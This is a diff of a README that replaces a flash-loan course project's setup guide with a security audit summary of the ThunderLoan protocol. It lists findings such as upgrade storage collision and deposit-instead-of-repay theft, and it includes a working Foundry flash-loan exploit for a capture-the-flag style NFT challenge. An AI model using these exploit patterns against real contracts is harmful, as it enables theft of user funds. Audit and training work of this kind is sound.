@@ -1,116 +1,268 @@
-# Thunder Loan
-
-<br/>
 <p align="center">
-<img src="./thunder-loan.svg" width="700" alt="thunder-loans">
-</p>
+<img src="./images/thunder-loan.svg" width="400" alt="thunder-loan">
 <br/>
 
+# 🔐 ThunderLoan Security Audit
 
-*A flash loan protocol based on [Aave](https://aave.com/) and [Compound](https://compound.finance/).*
+A comprehensive security audit of the **ThunderLoan** Flash Loan protocol.
 
-You can learn more about how [Aave works](https://www.youtube.com/watch?v=dTCwssZ116A) at a high level from [this video](https://www.youtube.com/watch?v=dTCwssZ116A).
+**Lead Security Researcher:** [GushALKDev](https://github.com/GushALKDev)
 
+---
 
-- [Thunder Loan](#thunder-loan)
-- [About](#about)
-- [Getting Started](#getting-started)
-  - [Requirements](#requirements)
-  - [Quickstart](#quickstart)
-- [Usage](#usage)
-  - [Testing](#testing)
-    - [Test Coverage](#test-coverage)
-- [Audit Scope Details](#audit-scope-details)
-  - [Roles](#roles)
-  - [Known Issues](#known-issues)
+## 📋 Table of Contents
 
-# About 
+- [Audit Overview](#audit-overview)
+- [📄 Full Audit Report (PDF)](#-full-audit-report-pdf)
+- [Severity Classification](#severity-classification)
+- [Executive Summary](#executive-summary)
+- [Findings](#findings)
+  - [High Severity](#-high-severity)
+  - [Medium Severity](#-medium-severity)
+  - [Low Severity](#-low-severity)
+  - [Informational](#-informational)
+  - [Gas Optimizations](#-gas-optimizations)
+- [Section 6: NFT Exploit Challenge](#-section-6-nft-exploit-challenge)
+- [Tools Used](#-tools-used)
+- [Lessons Learned](#-lessons-learned)
 
-The ⚡️ThunderLoan⚡️ protocol is meant to do the following:
+---
 
-1. Give users a way to create flash loans
-2. Give liquidity providers a way to earn money off their capital
+## Audit Overview
 
-Liquidity providers can `deposit` assets into `ThunderLoan` and be given `AssetTokens` in return. These `AssetTokens` gain interest over time depending on how often people take out flash loans!
+| Item | Detail |
+|------|--------|
+| **Audit Commit Hash** | `e643a8d4c2c802490976b538dd009b351b1c8dda` |
+| **Solidity Version** | `0.8.20` |
+| **Target Chain** | Ethereum |
+| **Scope** | `src/protocol/ThunderLoan.sol`, `src/protocol/AssetToken.sol`, `src/protocol/OracleUpgradeable.sol`, `src/upgradedProtocol/ThunderLoanUpgraded.sol` |
+| **Methods** | Manual Review, Static Analysis (Slither, Aderyn), Invariant Testing |
 
-What is a flash loan? 
+---
 
-A flash loan is a loan that exists for exactly 1 transaction. A user can borrow any amount of assets from the protocol as long as they pay it back in the same transaction. If they don't pay it back, the transaction reverts and the loan is cancelled.
+## 📄 Full Audit Report (PDF)
 
-Users additionally have to pay a small fee to the protocol depending on how much money they borrow. To calculate the fee, we're using the famous on-chain TSwap price oracle.
+> **[📥 Download the Complete Audit Report (PDF)](./audit-info/report.pdf)**
 
-We are planning to upgrade from the current `ThunderLoan` contract to the `ThunderLoanUpgraded` contract. Please include this upgrade in scope of a security review. 
+The full report contains detailed findings with complete Proof of Concept code, diff patches, and comprehensive recommendations.
 
-# Getting Started
+---
 
-## Requirements
+## Severity Classification
 
-- [git](https://git-scm.com/book/en/v2/Getting-Started-Installing-Git)
-  - You'll know you did it right if you can run `git --version` and you see a response like `git version x.x.x`
-- [foundry](https://getfoundry.sh/)
-  - You'll know you did it right if you can run `forge --version` and you see a response like `forge 0.2.0 (816e00b 2023-03-16T00:05:26.396218Z)`
+| Severity | Impact |
+|----------|--------|
+| 🔴 **High** | Critical vulnerabilities leading to direct loss of funds or complete compromise |
+| 🟠 **Medium** | Issues causing unexpected behavior or moderate financial impact |
+| 🟡 **Low** | Minor issues that don't directly risk funds |
+| 🔵 **Info** | Best practices and code quality improvements |
+| ⚡ **Gas** | Gas optimization opportunities |
 
-## Quickstart
+---
 
+## Executive Summary
+
+The **ThunderLoan** protocol contains **critical security vulnerabilities** that make it **unsafe for production deployment**. Major issues were found in the upgrade mechanism, exchange rate calculations, and flash loan repayment logic.
+
+### Key Metrics
+
+| Severity | Count |
+|----------|-------|
+| 🔴 High | 4 |
+| 🟠 Medium | 3 |
+| 🟡 Low | 4 |
+| 🔵 Info | 8 |
+| ⚡ Gas | 2 |
+| **Total** | **21** |
+
+### Critical Risks
+
+- ⚠️ **Storage Collision on Upgrade**: Fee changes from 0.3% to 100% after upgrade, breaking protocol.
+- ⚠️ **Exchange Rate Manipulation**: Deposits incorrectly update exchange rate, causing LP losses.
+- ⚠️ **Deposit Instead of Repay**: Users can steal funds by using `deposit()` instead of `repay()`.
+- ⚠️ **Incorrect Fee Calculation**: Flash loan fees are calculated in WETH value instead of token units.
+
+---
+
+## Findings
+
+### 🔴 High Severity
+
+| ID | Finding | Location |
+|----|---------|----------|
+| H-1 | Storage collision after upgrade breaks protocol functionality due to removal of `s_feePrecision` variable | `ThunderLoanUpgraded.sol` |
+| H-2 | Exchange rate is incorrectly updated during deposits, causing liquidity providers to lose funds | `ThunderLoan::deposit()` |
+| H-3 | Users can steal funds by depositing instead of repaying flash loans | `ThunderLoan::flashloan()` |
+| H-4 | Flash loan fee is calculated in WETH value instead of token units | `ThunderLoan::getCalculatedFee()` |
+
+---
+
+### 🟠 Medium Severity
+
+| ID | Finding | Location |
+|----|---------|----------|
+| M-1 | Oracle price manipulation allows attackers to pay reduced flash loan fees | `OracleUpgradeable::getPriceInWeth()` |
+| M-2 | Protocol becomes unusable if underlying token is paused or blacklisted | `AssetToken::transferUnderlyingTo()` |
+| M-3 | Nested flash loans with the same token break due to premature flag reset | `ThunderLoan::repay()` |
+
+---
+
+### 🟡 Low Severity
+
+| ID | Finding | Location |
+|----|---------|----------|
+| L-1 | Uninitialized proxy can be frontrun, allowing attacker to take ownership | `ThunderLoan::initialize()` |
+| L-2 | `IThunderLoan` interface is not implemented by `ThunderLoan` contract | Interface mismatch |
+| L-3 | Missing event emission when flash loan fee is updated | `ThunderLoan::updateFlashLoanFee()` |
+| L-4 | Division by zero if `totalSupply()` is zero in `updateExchangeRate()` | `AssetToken::updateExchangeRate()` |
+
+---
+
+### 🔵 Informational
+
+| ID | Finding |
+|----|---------|
+| I-1 | Solidity 0.8.20 includes PUSH0 opcode which may not be compatible with all EVM chains |
+| I-2 | Missing NatSpec documentation across multiple contracts |
+| I-3 | Unused error `ThunderLoan__ExhangeRateCanOnlyIncrease` |
+| I-4 | Incorrect import location for `IThunderLoan` interface |
+| I-5 | Centralization risk: Owner has significant control over protocol |
+| I-6 | `OracleUpgradeable::getPrice()` function is redundant |
+| I-7 | Functions could be marked as `external` instead of `public` |
+| I-8 | Insufficient test coverage leaves critical functionality untested |
+
+---
+
+### ⚡ Gas Optimizations
+
+| ID | Finding |
+|----|---------|
+| G-1 | Cache `s_exchangeRate` and `totalSupply()` in `updateExchangeRate()` |
+| G-2 | `s_feePrecision` should be a constant |
+
+---
+
+## 🎯 Section 6: NFT Exploit Challenge
+
+![NFT Exploit Challenge](./images/S6_NFT.png)
+
+### 🕵️‍♂️ The Challenge
+
+The Section 6 NFT challenge requires depositing **2,000,000 S6Tokens** into the `S6` contract to claim the **"Oracle Manipulation Wizard"** NFT. The catch? The only way to "buy" tokens is through a function that requires **1,000,000 ETH** – an obviously impossible amount.
+
+However, the `S6Market` contract provides a **flash loan** mechanism that allows borrowing the entire token supply without any fees!
+
+### 💡 The Vulnerability
+
+The vulnerability is **NOT in the flash loan**. Flash loans are designed to let you use tokens freely as long as you return them. The flaw is in the `S6` contract itself:
+
+1. `solveChallenge()` only checks the balance **at that moment in time**
+2. After minting the NFT, **nothing prevents you from withdrawing your tokens**
+3. This allows you to recover the deposited tokens and repay the flash loan
+
+```solidity
+// S6.sol - The vulnerable pattern
+function solveChallenge(string memory twitterHandle) external {
+    // Only checks balance NOW, doesn't lock tokens permanently
+    if (i_s6token.balanceOf(address(this)) >= S6_NFT_COST) {
+        emit Exploited("Contract Exploited!!");
+    }
+}
+
+function withdrawMoney() external {
+    // Can withdraw AFTER claiming the NFT!
+    uint256 balanceToReturn = s_balances[msg.sender];
+    s_balances[msg.sender] = 0;
+    i_s6token.safeTransfer(msg.sender, balanceToReturn);
+}
 ```
-git clone https://github.com/Cyfrin/6-thunder-loan-audit
-cd 6-thunder-loan-audit
-make 
+
+### 🔓 The Exploit
+
+The attack flow is:
+
+1. **Take a flash loan** for 2,000,000 S6Tokens from `S6Market`
+2. **Deposit tokens** into the `S6` contract during the `execute()` callback
+3. **Solve the challenge** while we have the required balance
+4. **Withdraw tokens** after claiming the NFT
+5. **Repay the flash loan** to complete the transaction
+
+### 💻 Proof of Concept
+
+```solidity
+contract S6FlashLoanExploit is Test, IFlashLoanReceiver {
+    using SafeERC20 for S6Token;
+
+    S6 private s6;
+    S6Token private s6Token;
+    S6Market private s6Market;
+
+    function setUp() public {
+        s6 = new S6(address(this));
+        s6Token = S6Token(s6.getToken());
+        s6Market = S6Market(s6.getMarket());
+    }
+
+    function testSolveS6Challenge() public {
+        // Start the flash loan
+        s6Market.flashLoan(2000000e18);
+        console2.log("Section 6 contract exploited!");
+    }
+
+    function execute() external payable {
+        // Approve the S6 contract to spend the tokens
+        s6Token.approve(address(s6), 2000000e18);
+        // Deposit the tokens
+        s6.depositMoney(2000000e18);
+        // Solve the challenge
+        s6.solveChallenge("");
+        // Withdraw the tokens after getting the NFT
+        s6.withdrawMoney();
+        // Repay the flash loan
+        s6Token.safeTransfer(msg.sender, s6Token.balanceOf(address(this)));
+    }
+
+    function owner() external view returns (address) {
+        return address(this);
+    }
+}
 ```
 
-# Usage
+### ✅ Key Takeaways
 
-## Testing
+1. **Point-in-time balance checks are dangerous**: Checking a balance only at one moment allows temporary deposits that can be withdrawn immediately after
+2. **If you require funds, lock them permanently**: The S6 contract should have transferred/burned the tokens, not just checked the balance
+3. **Flash loans amplify vulnerabilities**: While the flash loan worked correctly, it enabled exploiting the S6 contract's flawed logic
+4. **Always consider the full transaction flow**: The vulnerability only becomes apparent when you trace: borrow -> deposit -> claim -> withdraw -> repay
 
-```
-forge test
-```
+---
 
-### Test Coverage
+## 🛠 Tools Used
 
-```
-forge coverage
-```
+| Tool | Purpose |
+|------|---------|
+| [Foundry](https://github.com/foundry-rs/foundry) | Testing & local development |
+| [Slither](https://github.com/crytic/slither) | Static analysis |
+| [Aderyn](https://github.com/Cyfrin/aderyn) | Smart contract analyzer |
 
-and for coverage based testing: 
+---
 
-```
-forge coverage --report debug
-```
+## 📚 Lessons Learned
 
-# Audit Scope Details
+1.  **Storage Layout in Upgrades**: When upgrading contracts, never remove or reorder storage variables. Use placeholder slots if a variable must be deprecated.
 
-- Commit Hash: 8803f851f6b37e99eab2e94b4690c8b70e26b3f6
-- In Scope:
-```
-#-- interfaces
-|   #-- IFlashLoanReceiver.sol
-|   #-- IPoolFactory.sol
-|   #-- ITSwapPool.sol
-|   #-- IThunderLoan.sol
-#-- protocol
-|   #-- AssetToken.sol
-|   #-- OracleUpgradeable.sol
-|   #-- ThunderLoan.sol
-#-- upgradedProtocol
-    #-- ThunderLoanUpgraded.sol
-```
-- Solc Version: 0.8.20
-- Chain(s) to deploy contract to: Ethereum
-- ERC20s:
-  - USDC 
-  - DAI
-  - LINK
-  - WETH
+2.  **Flash Loan Protections**: Always verify HOW funds are returned, not just that the balance is correct. Use reentrancy guards and prevent deposits during flash loans.
 
-## Roles
+3.  **Oracle Security**: Spot prices from AMMs are trivially manipulable. Use TWAPs or Chainlink for any value-based calculations.
 
-- Owner: The owner of the protocol who has the power to upgrade the implementation. 
-- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
-- User: A user who takes out flash loans from the protocol.
+4.  **Exchange Rate Logic**: Be extremely careful with exchange rate updates. They should only occur when actual value (fees) is added to the protocol.
 
-## Known Issues
+5.  **Interface Consistency**: Ensure interfaces match their implementations exactly. Type mismatches (`address` vs `IERC20`) break interoperability.
 
-- We are aware that `getCalculatedFee` can result in 0 fees for very small flash loans. We are OK with that. There is some small rounding errors when it comes to low fees
-- We are aware that the first depositor gets an unfair advantage in assetToken distribution. We will be making a large initial deposit to mitigate this, and this is a known issue
-- We are aware that "weird" ERC20s break the protocol, including fee-on-transfer, rebasing, and ERC-777 tokens. The owner will vet any additional tokens before adding them to the protocol. 
+6.  **Test Coverage**: The 0% coverage on `ThunderLoanUpgraded.sol` directly contributed to missing H-1. Always test upgrade scenarios.
+
+7.  **Flash Loan Attack Patterns**: Flash loans enable "infinite capital" attacks. Any protocol with balance checks or deposit functions must consider flash loan vectors.
+
+---
+
+Made with ❤️ by **GushALKDev** | Advancing in Smart Contract Security
